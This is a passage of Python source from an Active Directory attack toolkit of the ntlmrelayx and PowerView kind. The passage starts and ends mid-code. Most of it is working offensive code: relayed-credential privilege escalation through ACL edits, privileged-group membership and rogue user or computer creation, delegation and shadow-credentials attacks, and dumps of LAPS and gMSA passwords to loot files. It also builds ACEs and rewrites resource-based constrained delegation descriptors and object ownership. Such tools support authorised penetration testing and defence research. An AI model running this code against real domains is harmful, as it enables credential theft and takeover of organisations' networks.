            LOG.info("Principals who can enroll using template `%s`: %s" % (entry["attributes"]["name"],
                     ", ".join(("`" + sid_map[principal] + "`" for principal in enrollment_principals))))


    def run(self):
        #self.client.search('dc=vulnerable,dc=contoso,dc=com', '(objectclass=person)')
        #print self.client.entries
        global dumpedDomain
        global dumpedAdcs
        # Set up a default config
        domainDumpConfig = ldapdomaindump.domainDumpConfig()

        # Change the output directory to configured rootdir
        domainDumpConfig.basepath = self.config.lootdir

        # Create new dumper object
        domainDumper = ldapdomaindump.domainDumper(self.client.server, self.client, domainDumpConfig)

        if self.config.interactive:
            if self.tcp_shell is not None:
                LOG.info('Started interactive Ldap shell via TCP on 127.0.0.1:%d' % self.tcp_shell.port)
                # Start listening and launch interactive shell.
                self.tcp_shell.listen()
                ldap_shell = LdapShell(self.tcp_shell, domainDumper, self.client)
                ldap_shell.cmdloop()
                return

        # If specified validate the user's privileges. This might take a while on large domains but will
        # identify the proper containers for escalating via the different techniques.
        if self.config.validateprivs:
            LOG.info('Enumerating relayed user\'s privileges. This may take a while on large domains')
            userSid, privs = self.validatePrivileges(self.username, domainDumper)
            if privs['create']:
                LOG.info('User privileges found: Create user')
            if privs['escalateViaGroup']:
                name = privs['escalateGroup'].split(',')[0][3:]
                LOG.info('User privileges found: Adding user to a privileged group (%s)' % name)
            if privs['aclEscalate']:
                LOG.info('User privileges found: Modifying domain ACL')

        # If validation of privileges is not desired, we assumed that the user has permissions to escalate
        # an existing user via ACL attacks.
        else:
            LOG.info('Assuming relayed user has privileges to escalate a user via ACL attack')
            privs = dict()
            privs['create'] = False
            privs['aclEscalate'] = True
            privs['escalateViaGroup'] = False

        # We prefer ACL escalation since it is more quiet
        if self.config.aclattack and privs['aclEscalate']:
            LOG.debug('Performing ACL attack')
            if self.config.escalateuser:
                # We can escalate an existing user
                result = self.getUserInfo(domainDumper, self.config.escalateuser)
                # Unless that account does not exist of course
                if not result:
                    LOG.error('Unable to escalate without a valid user.')
                else:
                    userDn, userSid = result
                    # Perform the ACL attack
                    self.aclAttack(userDn, domainDumper)
            elif privs['create']:
                # Create a nice shiny new user for the escalation
                userDn = self.addUser(privs['createIn'], domainDumper)
                if not userDn:
                    LOG.error('Unable to escalate without a valid user.')
                # Perform the ACL attack
                else:
                    self.aclAttack(userDn, domainDumper)
            else:
                LOG.error('Cannot perform ACL escalation because we do not have create user '\
                    'privileges. Specify a user to assign privileges to with --escalate-user')

        # If we can't ACL escalate, try adding us to a privileged group
        if self.config.addda and privs['escalateViaGroup']:
            LOG.debug('Performing Group attack')
            if self.config.escalateuser:
                # We can escalate an existing user
                result = self.getUserInfo(domainDumper, self.config.escalateuser)
                # Unless that account does not exist of course
                if not result:
                    LOG.error('Unable to escalate without a valid user.')
                # Perform the Group attack
                else:
                    userDn, userSid = result
                    self.addUserToGroup(userDn, domainDumper, privs['escalateGroup'])

            elif privs['create']:
                # Create a nice shiny new user for the escalation
                userDn = self.addUser(privs['createIn'], domainDumper)
                if not userDn:
                    LOG.error('Unable to escalate without a valid user, aborting.')
                # Perform the Group attack
                else:
                    self.addUserToGroup(userDn, domainDumper, privs['escalateGroup'])

            else:
                LOG.error('Cannot perform ACL escalation because we do not have create user '\
                          'privileges. Specify a user to assign privileges to with --escalate-user')

        # Dump LAPS Passwords
        if self.config.dumplaps:
            LOG.info("Attempting to dump LAPS passwords")

            success = self.client.search(domainDumper.root, '(&(objectCategory=computer))', search_scope=ldap3.SUBTREE, attributes=['DistinguishedName','ms-MCS-AdmPwd'])

            if success:

                fd = None
                filename = "laps-dump-" + self.username + "-" + str(random.randint(0, 99999))
                count = 0

                for entry in self.client.response:
                    try:
                        dn = "DN:" + entry['attributes']['distinguishedname']
                        passwd = "Password:" + entry['attributes']['ms-MCS-AdmPwd']

                        if fd is None:
                            fd = open(filename, "a+")

                        count += 1

                        LOG.debug(dn)
                        LOG.debug(passwd)

                        fd.write(dn)
                        fd.write("\n")
                        fd.write(passwd)
                        fd.write("\n")

                    except:
                        continue

                if fd is None:
                    LOG.info("The relayed user %s does not have permissions to read any LAPS passwords" % self.username)
                else:
                    LOG.info("Successfully dumped %d LAPS passwords through relayed account %s" % (count, self.username))
                    fd.close()

        #Dump gMSA Passwords
        if self.config.dumpgmsa:
            LOG.info("Attempting to dump gMSA passwords")

            if not self.client.tls_started and not self.client.server.ssl:
                LOG.info('Dumping gMSA password requires TLS but ldap:// scheme provided. Switching target to LDAPS via StartTLS')
                if not self.client.start_tls():
                    LOG.error('StartTLS failed')
                    return False

            success = self.client.search(domainDumper.root, '(&(ObjectClass=msDS-GroupManagedServiceAccount))', search_scope=ldap3.SUBTREE, attributes=['sAMAccountName','msDS-ManagedPassword'])
            if success:
                fd = None
                filename = "gmsa-dump-" + self.username + "-" + str(random.randint(0, 99999))
                count = 0
                for entry in self.client.response:
                    try:
                        sam = entry['attributes']['sAMAccountName']
                        data = entry['attributes']['msDS-ManagedPassword']
                        blob = MSDS_MANAGEDPASSWORD_BLOB()
                        blob.fromString(data)
                        hash = MD4.new ()
                        hash.update (blob['CurrentPassword'][:-2])
                        passwd = binascii.hexlify(hash.digest()).decode("utf-8")
                        userpass = sam + ':::' + passwd
                        LOG.info(userpass)
                        count += 1
                        if fd is None:
                            fd = open(filename, "a+")
                        fd.write(userpass)
                        fd.write("\n")
                    except:
                        continue
                if fd is None:
                    LOG.info("The relayed user %s does not have permissions to read any gMSA passwords" % self.username)
                else:
                    LOG.info("Successfully dumped %d gMSA passwords through relayed account %s" % (count, self.username))
                    fd.close()

        if not dumpedAdcs and self.config.dumpadcs:
            dumpedAdcs = True
            self.dumpADCS()
            LOG.info("Done dumping ADCS info")

        # Perform the Delegate attack if it is enabled and we relayed a computer account
        if self.config.delegateaccess and self.username[-1] == '$':
            self.delegateAttack(self.config.escalateuser, self.username, domainDumper, self.config.sid)
            return

        # Add a new computer if that is requested
        # privileges required are not yet enumerated, neither is ms-ds-MachineAccountQuota
        if self.config.addcomputer is not None:
            self.client.search(domainDumper.root, "(ObjectClass=domain)", attributes=['wellKnownObjects'])
            # Computer well-known GUID
            # https://social.technet.microsoft.com/Forums/windowsserver/en-US/d028952f-a25a-42e6-99c5-28beae2d3ac3/how-can-i-know-the-default-computer-container?forum=winservergen
            computerscontainer = [
                entry.decode('utf-8').split(":")[-1] for entry in self.client.entries[0]["wellKnownObjects"]
                if b"AA312825768811D1ADED00C04FD8D5CD" in entry
            ][0]
            LOG.debug("Computer container is {}".format(computerscontainer))
            self.addComputer(computerscontainer, domainDumper)
            return

        # Perform the Shadow Credentials attack if it is enabled
        if self.config.IsShadowCredentialsAttack:
            self.shadowCredentialsAttack(domainDumper)
            return

        # Last attack, dump the domain if no special privileges are present
        if not dumpedDomain and self.config.dumpdomain:
            # Do this before the dump is complete because of the time this can take
            dumpedDomain = True
            LOG.info('Dumping domain info for first time')
            domainDumper.domainDump()
            LOG.info('Domain info dumped into lootdir!')

# Builds a standard ACE for a specified access mask (rights) and a specified SID (the principal who obtains the right)
# https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/72e7c7ea-bc02-4c74-a619-818a16bf6adb
#   - access_mask : the allowed access mask
#   - sid : the principal's SID
#   - ace_type : the ACE type (allowed or denied)
def create_ace(access_mask, sid, ace_type, aceflags=0x00):
    nace = ldaptypes.ACE()
    nace['AceType'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE
    nace['AceFlags'] = aceflags
    acedata = ldaptypes.ACCESS_ALLOWED_ACE()
    acedata['Mask'] = ldaptypes.ACCESS_MASK()
    acedata['Mask']['Mask'] = access_mask
    acedata['Sid'] = ldaptypes.LDAP_SID()
    acedata['Sid'].fromCanonical(sid)
    nace['Ace'] = acedata
    logging.debug('ACE created.')
    return nace

# Create an object ACE with the specified privguid and our sid
def create_object_ace(privguid, sid, aceflags=0x00):
    nace = ldaptypes.ACE()
    nace['AceType'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE
    nace['AceFlags'] = aceflags # inherit to child objects
    acedata = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE()
    acedata['Mask'] = ldaptypes.ACCESS_MASK()
    #acedata['Mask']['Mask'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_CONTROL_ACCESS
    if privguid == EXTENDED_RIGHTS_NAME_MAP['Self-Membership']:
        acedata['Mask']['Mask'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_READ_PROP + ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_WRITE_PROP
    else:
        acedata['Mask']['Mask'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_CONTROL_ACCESS
    #acedata['Mask']['Mask'] = 983551 # Full control
    acedata['ObjectType'] = string_to_bin(privguid)
    acedata['InheritedObjectType'] = b''
    acedata['Sid'] = ldaptypes.LDAP_SID()
    acedata['Sid'].fromCanonical(sid)
    assert sid == acedata['Sid'].formatCanonical()
    acedata['Flags'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT
    nace['Ace'] = acedata
    return nace

# Create an ALLOW ACE with the specified sid
def create_allow_ace(sid, aceflags=0x00):
    nace = ldaptypes.ACE()
    nace['AceType'] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
    nace['AceFlags'] = aceflags
    acedata = ldaptypes.ACCESS_ALLOWED_ACE()
    acedata['Mask'] = ldaptypes.ACCESS_MASK()
    acedata['Mask']['Mask'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_CONTROL_ACCESS
    acedata['Sid'] = ldaptypes.LDAP_SID()
    acedata['Sid'].fromCanonical(sid)
    nace['Ace'] = acedata
    return nace

def create_empty_sd():
    sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
    sd['Revision'] = b'\x01'
    sd['Sbz1'] = b'\x00'
    sd['Control'] = 32772
    sd['OwnerSid'] = ldaptypes.LDAP_SID()
    # BUILTIN\Administrators
    sd['OwnerSid'].fromCanonical('S-1-5-32-544')
    sd['GroupSid'] = b''
    sd['Sacl'] = b''
    acl = ldaptypes.ACL()
    acl['AclRevision'] = 4
    acl['Sbz1'] = 0
    acl['Sbz2'] = 0
    acl.aces = []
    sd['Dacl'] = acl
    return sd

# Check if an ACE allows for creation of users
def can_create_users(ace):
    createprivs = ace['Ace']['Mask'].hasPriv(ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_CREATE_CHILD)
    if ace['AceType'] != ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE or ace['Ace']['ObjectType'] == b'':
        return False
    userprivs = bin_to_string(ace['Ace']['ObjectType']).lower() == 'bf967aba-0de6-11d0-a285-00aa003049e2'
    return createprivs and userprivs

# Check if an ACE allows for adding members
def can_add_member(ace):
    writeprivs = ace['Ace']['Mask'].hasPriv(ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_WRITE_PROP)
    if ace['AceType'] != ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE or ace['Ace']['ObjectType'] == b'':
        return writeprivs
    userprivs = bin_to_string(ace['Ace']['ObjectType']).lower() == 'bf9679c0-0de6-11d0-a285-00aa003049e2'
    return writeprivs and userprivs

class ADUser:
    def __init__(self, client, root_dn, parent=None):
        if parent:
            self.__parent = parent
        self.__client = client
        self.__root_dn = root_dn

    def removeUser(self, user_dn):
        if not user_dn:
            LOG.error('User distinguishedName is required')
            return

        if self.__client.delete(user_dn):
            LOG.info(f'Successfully removed {user_dn} from domain')
            return True
        else:
            return False

    def addUser(self, newUser=None, newPassword=None):
        """
        Add a new user. Parent is preferably CN=Users,DC=Domain,DC=local, but can
        also be an OU or other container where we have write privileges
        """
        if not self.__client.tls_started and not self.__client.server.ssl:
            LOG.info('Adding a user account to the domain requires TLS but ldap:// scheme provided. Switching target to LDAPS via StartTLS')
            if not self.__client.start_tls():
                LOG.error('StartTLS failed')
                return False

        # Random password
        if not newPassword:
            newPassword = ''.join(random.choice(string.ascii_letters + string.digits + '.,;:!$-_+/*(){}#@<>^') for _ in range(15))

        # Random username
        if not newUser:
            newUser = ''.join(random.choice(string.ascii_letters) for _ in range(10))

        newUserDn = 'CN=%s,%s' % (newUser, self.__parent)
        ucd = {
            'objectCategory': 'CN=Person,CN=Schema,CN=Configuration,%s' % self.__root_dn,
            'distinguishedName': newUserDn,
            'cn': newUser,
            'sn': newUser,
            'givenName': newUser,
            'displayName': newUser,
            'name': newUser,
            'userAccountControl': 512,
            'accountExpires': '0',
            'sAMAccountName': newUser,
            'unicodePwd': '"{}"'.format(newPassword).encode('utf-16-le'),
        }
        LOG.info('Attempting to create user in: %s', self.__parent)
        res = self.__client.add(newUserDn, ['top', 'person', 'organizationalPerson', 'user'], ucd)
        if not res:
            # Adding users requires LDAPS
            if self.__client.result['result'] == RESULT_UNWILLING_TO_PERFORM and not self.__client.server.ssl:
                LOG.error('Failed to add a new user. The server denied the operation. Try relaying to LDAP with TLS enabled (ldaps) or escalating an existing user.')
            else:
                LOG.error('Failed to add a new user: %s' % str(self.__client.result['message']))
            return False
        else:
            LOG.info('Adding new user with username: %s and password: %s result: OK' % (newUser, newPassword))

            # Return the DN
            return newUserDn

class ACE_FLAGS(Enum):
    CONTAINER_INHERIT_ACE = ACE.CONTAINER_INHERIT_ACE
    FAILED_ACCESS_ACE_FLAG = ACE.FAILED_ACCESS_ACE_FLAG
    INHERIT_ONLY_ACE = ACE.INHERIT_ONLY_ACE
    INHERITED_ACE = ACE.INHERITED_ACE
    NO_PROPAGATE_INHERIT_ACE = ACE.NO_PROPAGATE_INHERIT_ACE
    OBJECT_INHERIT_ACE = ACE.OBJECT_INHERIT_ACE
    SUCCESSFUL_ACCESS_ACE_FLAG = ACE.SUCCESSFUL_ACCESS_ACE_FLAG

class OBJECT_ACE_FLAGS(Enum):
    ACE_OBJECT_TYPE_PRESENT = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT
    ACE_INHERITED_OBJECT_TYPE_PRESENT = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_INHERITED_OBJECT_TYPE_PRESENT

class ACCESS_MASK(Enum):
    # Generic Rights
    GenericRead = 0x80000000 # ADS_RIGHT_GENERIC_READ
    GenericWrite = 0x40000000 # ADS_RIGHT_GENERIC_WRITE
    GenericExecute = 0x20000000 # ADS_RIGHT_GENERIC_EXECUTE
    GenericAll = 0x10000000 # ADS_RIGHT_GENERIC_ALL

    # Maximum Allowed access type
    MaximumAllowed = 0x02000000

    # Access System Acl access type
    AccessSystemSecurity = 0x01000000 # ADS_RIGHT_ACCESS_SYSTEM_SECURITY

    # Standard access types
    Synchronize = 0x00100000 # ADS_RIGHT_SYNCHRONIZE
    WriteOwner = 0x00080000 # ADS_RIGHT_WRITE_OWNER
    WriteDACL = 0x00040000 # ADS_RIGHT_WRITE_DAC
    ReadControl = 0x00020000 # ADS_RIGHT_READ_CONTROL
    Delete = 0x00010000 # ADS_RIGHT_DELETE

    # Specific rights
    AllExtendedRights = 0x00000100 # ADS_RIGHT_DS_CONTROL_ACCESS
    ListObject = 0x00000080 # ADS_RIGHT_DS_LIST_OBJECT
    DeleteTree = 0x00000040 # ADS_RIGHT_DS_DELETE_TREE
    WriteProperties = 0x00000020 # ADS_RIGHT_DS_WRITE_PROP
    ReadProperties = 0x00000010 # ADS_RIGHT_DS_READ_PROP
    Self = 0x00000008 # ADS_RIGHT_DS_SELF
    ListChildObjects = 0x00000004 # ADS_RIGHT_ACTRL_DS_LIST
    DeleteChild = 0x00000002 # ADS_RIGHT_DS_DELETE_CHILD
    CreateChild = 0x00000001 # ADS_RIGHT_DS_CREATE_CHILD

class SIMPLE_PERMISSIONS(Enum):
    FullControl = 0xf01ff
    Modify = 0x0301bf
    ReadAndExecute = 0x0200a9
    ReadAndWrite = 0x02019f
    Read = 0x20094
    Write = 0x200bc

class ALLOWED_OBJECT_ACE_MASK_FLAGS(Enum):
    ControlAccess = ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_CONTROL_ACCESS
    CreateChild = ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_CREATE_CHILD
    DeleteChild = ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_DELETE_CHILD
    ReadProperty = ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_READ_PROP
    WriteProperty = ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_WRITE_PROP
    Self = ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_SELF

class ACLEnum:
    def __init__(self, powerview, entries, root_dn, resolveguids=None, targetidentity=None, principalidentity=None, guids_map_dict=None):
        self.entries = entries
        self.powerview = powerview
        self.root_dn = root_dn
        self.objectdn = ''
        self.objectsid = ''

        self.__resolveguids = resolveguids
        self.__targetidentity = targetidentity
        self.__principalidentity = principalidentity
        
        # Combine the GUID maps
        self.__guids_map_dict = {}
        # Add guids_map_dict if provided
        if guids_map_dict:
            self.__guids_map_dict.update(guids_map_dict)
        
        # Add EXTENDED_RIGHTS_MAP (key: guid, value: name)
        self.__guids_map_dict.update(EXTENDED_RIGHTS_MAP)
        self.__guids_map_dict.update(SCHEMA_OBJECTS)
        
        # Add reverse mapping from EXTENDED_RIGHTS_NAME_MAP (key: guid, value: name)
        # This is already the reverse of EXTENDED_RIGHTS_MAP, so we don't need to add it
        
        # Create reverse mapping for lookups by name
        self.__rights_name_map = {v: k for k, v in self.__guids_map_dict.items()}


    def read_dacl(self):
        parsed_dacl = []
        LOG.debug("[ACLEnum] Parsing DACL")
        for entry in self.entries:
            dacl_dict = {}
            
            secDescData = entry.get('attributes', {}).get('nTSecurityDescriptor')
            if not secDescData:
                LOG.debug(f'[ACLEnum] ntSecurityDescriptor attribute not found for {entry.get("dn")}')
                continue
            
            if isinstance(secDescData, list):
                secDescData = secDescData[0]
            
            objectsid = entry.get('attributes', {}).get('objectSid') or None
            if isinstance(objectsid, list) and len(objectsid) > 0:
                objectsid = objectsid[0]
            
            try:
                secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=secDescData)
                self.objectdn = entry.get('dn')
                self.objectsid = objectsid
                dacl = self.parseDACL(secDesc['Dacl'])
                if dacl:
                    dacl_dict['attributes'] = dacl
                    parsed_dacl.append(dacl_dict)
            except Exception as e:
                LOG.debug(f'[ACLEnum] Error parsing security descriptor for {entry.get("dn")}: {str(e)}')
                continue
            
        return parsed_dacl

    def parseDACL(self, dacl):
        parsed_dacl = []
        for ace in dacl['Data']:
            parsed_ace = self.parseACE(ace)
            if parsed_ace:
                parsed_dacl.append(parsed_ace)
        return parsed_dacl

    def parseACE(self, ace):
        if self.__principalidentity and self.__principalidentity != ace["Ace"]["Sid"].formatCanonical():
            return

        if ace['TypeName'] in ["ACCESS_ALLOWED_ACE", "ACCESS_ALLOWED_OBJECT_ACE", "ACCESS_DENIED_ACE", "ACCESS_DENIED_OBJECT_ACE"]:
            parsed_ace = {}
            parsed_ace['ObjectDN'] = self.objectdn
            parsed_ace['ObjectSID'] = format_sid(self.objectsid)
            parsed_ace['ACEType'] = ace['TypeName']
            
            # Parse ACE Flags
            _ace_flags = [FLAG.name for FLAG in ACE_FLAGS if ace.hasFlag(FLAG.value)]
            parsed_ace['ACEFlags'] = ", ".join(_ace_flags) or "None"
            
            if ace['TypeName'] in ["ACCESS_ALLOWED_ACE", "ACCESS_DENIED_ACE"]:
                parsed_ace['ActiveDirectoryRights'] = ",".join(self.parsePerms(ace["Ace"]["Mask"]["Mask"]))
                parsed_ace['AccessMask'] = ",".join(self.parsePerms(ace['Ace']['Mask']['Mask']))
                parsed_ace['InheritanceType'] = "None"
                parsed_ace['SecurityIdentifier'] = self.powerview.convertfrom_sid(ace['Ace']['Sid'].formatCanonical())
            
            elif ace['TypeName'] in ["ACCESS_ALLOWED_OBJECT_ACE", "ACCESS_DENIED_OBJECT_ACE"]:
                # Parse Access Mask Flags
                _access_mask_flags = [FLAG.name for FLAG in ALLOWED_OBJECT_ACE_MASK_FLAGS if ace['Ace']['Mask'].hasPriv(FLAG.value)]
                parsed_ace['AccessMask'] = ", ".join(_access_mask_flags)
                
                # Parse Object Flags
                _object_flags = [FLAG.name for FLAG in OBJECT_ACE_FLAGS if ace['Ace'].hasFlag(FLAG.value)]
                parsed_ace['ObjectAceFlags'] = ", ".join(_object_flags) or None
                
                # Parse ObjectType GUID
                if ace['Ace']['ObjectTypeLen'] != 0:
                    obj_type = bin_to_string(ace['Ace']['ObjectType']).lower()
                    parsed_ace['ObjectAceType'] = self.__guids_map_dict.get(obj_type, "UNKNOWN (%s)" % obj_type)
                
                # Parse InheritedObjectType GUID
                if ace['Ace']['InheritedObjectTypeLen'] != 0:
                    inh_obj_type = bin_to_string(ace['Ace']['InheritedObjectType']).lower()
                    parsed_ace['InheritanceType'] = self.__guids_map_dict.get(inh_obj_type, "UNKNOWN (%s)" % inh_obj_type)
                else:
                    parsed_ace['InheritanceType'] = None
                
                # Parse Trustee SID
                parsed_ace['SecurityIdentifier'] = self.powerview.convertfrom_sid(ace['Ace']['Sid'].formatCanonical())
        else:
            LOG.debug("ACE Type (%s) unsupported for parsing yet, feel free to contribute" % ace['TypeName'])
            parsed_ace = {'ACEType': ace['TypeName'], 'ACEFlags': ", ".join(_ace_flags) or "None", 'DEBUG': "ACE type not supported for parsing by dacleditor.py, feel free to contribute"}
        
        return parsed_ace

    def parsePerms(self, fsr):
        _perms = []
        for PERM in SIMPLE_PERMISSIONS:
            if (fsr & PERM.value) == PERM.value:
                _perms.append(PERM.name)
                fsr = fsr & (not PERM.value)
        for PERM in ACCESS_MASK:
            if fsr & PERM.value:
                _perms.append(PERM.name)
        return _perms

class ObjectOwner:
    def __init__(self, entry):
        try:
            self.__target_samaccountname = entry["attributes"]["sAMAccountName"][0] if isinstance(entry["attributes"]["sAMAccountName"],list) else entry["attributes"]["sAMAccountName"]
        except IndexError as e:
            pass
        try:
            self.__target_sid = entry["attributes"]["objectSid"][0] if isinstance(entry["attributes"]["objectSid"], list) else entry["attributes"]["objectSid"]
        except IndexError as e:
            pass
        try:
            self.__target_dn = entry["attributes"]["distinguishedName"][0] if isinstance(entry["attributes"]["distinguishedName"], list) else entry["attributes"]["distinguishedName"]
        except IndexError as e:
            pass
        try:
            self.__target_secdesc = entry["attributes"]["nTSecurityDescriptor"][0] if isinstance(entry["attributes"]["nTSecurityDescriptor"], list) else entry["attributes"]["nTSecurityDescriptor"]
        except IndexError as e:
            pass
        self.__target_securitydescriptor = ldaptypes.SR_SECURITY_DESCRIPTOR(data=self.__target_secdesc)

        self.new_owner_samaccountname = None
        self.new_owner_sid = None
        self.new_owner_dn = None

    def modify_securitydescriptor(self, entry):
        try:
            self.new_owner_samaccountname = entry["attributes"]["sAMAccountName"][0] if isinstance(entry["attributes"]["sAMAccountName"], list) else entry["attributes"]["sAMAccountName"]
        except IndexError as e:
            pass
        try:
            self.new_owner_sid = entry["attributes"]["objectSid"][0] if isinstance(entry["attributes"]["objectSid"], list) else entry["attributes"]["objectSid"]
        except IndexError as e:
            pass
        try:
            self.new_owner_dn = entry["attributes"]["distinguishedName"] if isinstance(entry["attributes"]["distinguishedName"], list) else entry["attributes"]["distinguishedName"]
        except IndexError as e:
            pass

        new_owner_sid = ldaptypes.LDAP_SID()
        new_owner_sid.fromCanonical(self.new_owner_sid)

        logging.debug("Modifying %s OwnerSid to %s" % (self.__target_dn, self.new_owner_sid))

        self.__target_securitydescriptor['OwnerSid'] = new_owner_sid
        return self.__target_securitydescriptor

    def read(self):
        ownersid = None
        ownersid = format_sid(self.__target_securitydescriptor['OwnerSid']).formatCanonical()
        return ownersid

class RBCD:
    def __init__(self, entry, ldap_session=None):
        try:
            self.__target_samaccountname = entry["attributes"]["sAMAccountName"][0] if isinstance(entry["attributes"]["sAMAccountName"], list) else entry["attributes"]["sAMAccountName"]
        except IndexError as e:
            self.__target_samaccountname = None
            pass
        try:
            self.__target_sid = entry["attributes"]["objectSid"][0] if isinstance(entry["attributes"]["objectSid"], list) else entry["attributes"]["objectSid"]
        except IndexError as e:
            self.__target_sid = None
            pass
        try:
            self.__target_dn = entry["attributes"]["distinguishedName"][0] if isinstance(entry["attributes"]["distinguishedName"], list) else entry["attributes"]["distinguishedName"]
        except IndexError as e:
            self.__target_dn = None
            pass
        try:
            self.__target_msds_allowedtoactonbehalfofotheridentity = entry["attributes"]["msDS-AllowedToActOnBehalfOfOtherIdentity"][0] if isinstance(entry["attributes"]["msDS-AllowedToActOnBehalfOfOtherIdentity"], list) else entry["attributes"]["msDS-AllowedToActOnBehalfOfOtherIdentity"]
        except IndexError as e:
            self.__target_msds_allowedtoactonbehalfofotheridentity = None
            pass
        try:
            self.__target_securitydescriptor = ldaptypes.SR_SECURITY_DESCRIPTOR(data=self.__target_msds_allowedtoactonbehalfofotheridentity)
        except:
            self.__target_securitydescriptor = None
            pass


        self.ldap_session = ldap_session

    def read(self):
        if self.__target_securitydescriptor is None:
            logging.error("[RBCD] msDS-AllowedToActOnBehalfOfOtherIdentity not found in object")
            return

        user_can_delegate = []
        sd = self.__target_securitydescriptor
        if len(sd['Dacl'].aces) > 0:
            for ace in sd['Dacl'].aces:
                user_can_delegate.append(ace['Ace']['Sid'].formatCanonical())

        return user_can_delegate

    def write_to(self, objectsid):
        logging.debug("[RBCD] Creating SDDL manually")
        sd = create_empty_sd()
        sd['Dacl'].aces.append(create_allow_ace(objectsid))
        logging.debug(f"[RBCD] Appended {objectsid} to SDDL")
        self.ldap_session.modify(
            self.__target_dn,
            {
                'msDS-AllowedToActOnBehalfOfOtherIdentity':[ldap3.MODIFY_REPLACE, [sd.getData()]]
            }
        )
        if self.ldap_session.result['result'] == 0:
            return True
        else:
            if self.ldap_session.result['result'] == 50:
                logging.error('Could not modify object, the server reports insufficient rights: %s', self.ldap_session.result['message'])
            elif self.ldap_session.result['result'] == 19:
                logging.error('Could not modify object, the server reports a constrained violation: %s', self.ldap_session.result['message'])
            else:
                logging.error('The server returned an error: %s', self.ldap_session.result['message'])
            return False

class Trust:
    """
    Class for processing domain trust LDAP objects, including all trust attributes:
    - Basic properties (name, trustPartner, flatName, etc.)
    - Security identifier
    - Security descriptor (nTSecurityDescriptor)
    - Trust authentication keys (trustAuthIncoming, trustAuthOutgoing)
    
    This class handles the parsing of all trust-related attributes and provides
    structured access to the trust information.
    
    Usage:
    ```
    # Process a trust entry from LDAP
    trust_entry = ldap_entries[0]  # From get_domaintrust()
    trust = Trust(trust_entry)
    
    # Access processed trust information
    print(f"Trust Name: {trust.name}")
    print(f"Trust Partner: {trust.trust_partner}")
    print(f"Trust Direction: {trust.trust_direction}")
    
    # Access trust keys
    if trust.has_incoming_keys():
        print("Incoming Keys:")
        for key in trust.incoming_keys:
            print(f"  {key['KeyType']}: {key['Key']}")
    
    # Get a structured dictionary representation
    trust_dict = trust.to_dict()
    ```
    
    Security note:
    These trust attributes, especially trust keys, are highly sensitive and can be used 
    for various attacks including:
    - Creating forged Kerberos tickets for lateral movement across trust boundaries
    - Impersonating users from the trusted domain
    
    Extraction and use of these attributes requires high privileges (usually Domain Admin).
    """
    # Trust key types
    TRUST_AUTH_TYPE_CLEAR = 0x1      # Plaintext (not used)
    TRUST_AUTH_TYPE_NT4OWF = 0x2     # NT4 OWF (not used)
    TRUST_AUTH_TYPE_CLEAR_PW = 0x3   # UTF-16 plaintext password
    TRUST_AUTH_TYPE_CLEAR_NT_ONLY = 0x4  # RC4-HMAC key only (used for NT-compatible domains)
    TRUST_AUTH_TYPE_CLEAR_BOTH = 0x5 # RC4-HMAC and UTF-16 plaintext password
    TRUST_AUTH_TYPE_VERSION = 0x6    # VERSION (contains AES keys)
    
    # Trust direction
    TRUST_DIRECTION_DISABLED = 0
    TRUST_DIRECTION_INBOUND = 1
    TRUST_DIRECTION_OUTBOUND = 2
    TRUST_DIRECTION_BIDIRECTIONAL = 3
    
    # Trust type
    TRUST_TYPE_DOWNLEVEL = 1     # Windows NT 4.0 or earlier
    TRUST_TYPE_UPLEVEL = 2       # Windows 2000 or later
    TRUST_TYPE_MIT = 3           # MIT Kerberos realm
    TRUST_TYPE_DCE = 4           # DCE realm
    
    # Trust attributes
    TRUST_ATTRIBUTE_NON_TRANSITIVE = 0x00000001
    TRUST_ATTRIBUTE_UPLEVEL_ONLY = 0x00000002
    TRUST_ATTRIBUTE_QUARANTINED_DOMAIN = 0x00000004
    TRUST_ATTRIBUTE_FOREST_TRANSITIVE = 0x00000008
    TRUST_ATTRIBUTE_CROSS_ORGANIZATION = 0x00000010
    TRUST_ATTRIBUTE_WITHIN_FOREST = 0x00000020
    TRUST_ATTRIBUTE_TREAT_AS_EXTERNAL = 0x00000040
    TRUST_ATTRIBUTE_USES_RC4_ENCRYPTION = 0x00000080
    
    def __init__(self, entry=None):
        """
        Initialize a Trust object from an LDAP entry.
        
        Args:
            entry: An LDAP entry dictionary from get_domaintrust()
        """
        # Basic attributes
        self.dn = None
        self.name = None
        self.trust_partner = None
        self.flat_name = None
        self.trust_direction = None
        self.trust_type = None
        self.trust_attributes = None
        self.when_created = None
        self.when_changed = None
        
        # Security
        self.security_identifier = None
        self.owner_sid = None
        
        # Trust keys
        self.incoming_keys_raw = None
        self.outgoing_keys_raw = None
        self.incoming_keys = []
        self.outgoing_keys = []
        
        # Process the entry if provided
        if entry:
            self.process_entry(entry)
    
    def process_entry(self, entry):
        """
        Process an LDAP entry and extract all trust attributes.
        
        Args:
            entry: An LDAP entry dictionary from get_domaintrust()
        """
        if not entry:
            return
            
